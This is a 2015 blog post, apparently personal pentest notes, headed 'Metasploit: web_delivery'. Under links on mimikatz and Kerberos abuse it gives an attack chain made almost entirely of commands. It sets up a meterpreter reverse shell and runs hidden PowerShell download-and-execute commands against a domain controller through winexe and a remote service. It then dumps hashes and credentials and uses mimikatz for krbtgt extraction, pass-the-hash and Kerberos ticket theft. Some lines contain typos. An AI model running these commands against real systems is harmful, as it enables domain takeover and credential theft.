---
layout: post
title: "Metasploit: web_delivery"
date: 2015-07-10 09:33:08 +0900
comments: true
categories: 
---

* [mimikatz @ passwords#14](http://www.slideshare.net/gentilkiwi/mimikatz-how-to-push-microsoft-to-change-some-little-stuff)
* [Mimikatz 2.0 - Golden Ticket Walkthrough](http://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html)
* [Abusing Microsoft Kerberos by Alva DUCKWALL & Benjamin DELPY](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf)
* [Kerberos tickets](http://www.ietf.org/rfc/rfc4120.txt)
* [RFC4757](http://www.ietf.org/rfc/rfc4757.txt)
* [Microsoft Specific PAC](http://msdn.microsoft.com/library/cc237917.aspx)

```
exploit(web_delivery) > set TARGET 2
exploit(web_delivery) > set PAYLOAD windows/meterpreter/reverse_tcp
exploit(web_delivery) > set LHOST 172.16.3.76
exploit(web_delivery) > set LPORT 8686
exploit(web_delivery) > run
[*] Exploit running as background job.

[*] [...] Started reverse handler on 172.16.3.76:8686
[*] [...] Using URL: http://0.0.0.0:8080/moKqrqIYh0
...

$ winexe -k DOMAIN //dc01 "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.3.76:8080/moKqrqIYh0'))"

...
meterpreter > getuid
meterpreter > getsystem
meterpreter > getprivs
meterpreter > portfwd ...

$ python forgeTGT.py ...
$ wine mimikatz.exe "kerberos::clist TGT_... /export" exit

meterpreter > load kiwi
meterpreter > kerberos_ticket_use /root/git/....DOAMIN.kirbi
meterpreter > shell

c:\> sc \\dc01\ create psh binPath="cmd.exe /c powershell -nop -w hidden -c IEK ((new-object net.webclient).downloadstring('172.16.3.76:8080/moKqrqIYh0'))"
c:\> sc \\dc01\ start psh
c:\> sc \\dc01\ delete psh
c:\> exit

meterpreter > background
meterpreter > sessions -i ...
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/windows/gather/credentials/credential_collector
```

mimikatz

```
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::ekeys
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # lsadump::lsa /inject /name:Administrator
mimikatz # sekurlsa::pth /user:Administrator /domain:babo.local /ntlm:cc36...
mimikatz # kerberos::list /export
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # sekurlsa::tickets /export
```

* Kerberos::Overpass-the-hash
* [Kerberos::Pass-the-ticket](http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx)
